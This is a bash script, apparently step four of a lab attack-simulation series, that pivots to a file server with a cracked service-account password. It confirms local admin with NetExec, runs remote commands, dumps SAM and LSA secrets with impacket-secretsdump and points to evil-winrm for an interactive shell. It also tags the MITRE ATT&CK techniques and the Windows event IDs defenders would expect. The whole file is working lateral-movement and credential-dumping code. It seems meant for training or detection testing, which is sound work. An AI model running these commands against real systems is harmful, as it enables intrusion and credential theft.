#!/usr/bin/env bash
# Step 4: Use the cracked service account (local admin on fs01) to pivot and
# dump credentials. Pass the cracked password as the first argument.
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$FS_IP"

SVC_USER="svc-backup"
SVC_PASS="${1:-Autumn2024!}"   # pass the cracked password, or rely on the lab default

banner "04 LATERAL MOVEMENT - pivot to fs01 as $SVC_USER"
atk "T1021.002 SMB/Admin Shares | T1021.006 WinRM | T1003 OS Credential Dumping"

echo "[*] Confirming admin on fs01 (Pwn3d! means local admin)..."
nxc smb "$FS_IP" -u "$SVC_USER" -p "$SVC_PASS"

echo "[*] Running a command remotely to prove execution..."
nxc smb "$FS_IP" -u "$SVC_USER" -p "$SVC_PASS" -x "whoami && hostname" | tee "$LOOT/fs01-exec.txt"

echo "[*] Dumping local secrets (SAM + LSA) from fs01..."
impacket-secretsdump "$DOMAIN/$SVC_USER:$SVC_PASS@$FS_IP" | tee "$LOOT/fs01-secretsdump.txt"

echo "[+] For an interactive shell:  evil-winrm -i $FS_IP -u $SVC_USER -p '$SVC_PASS'"
expect "4624 type 3 + 4672 (special privileges) for svc-backup on fs01."
expect "secretsdump installs/removes a service: 7045 service install + 4688."
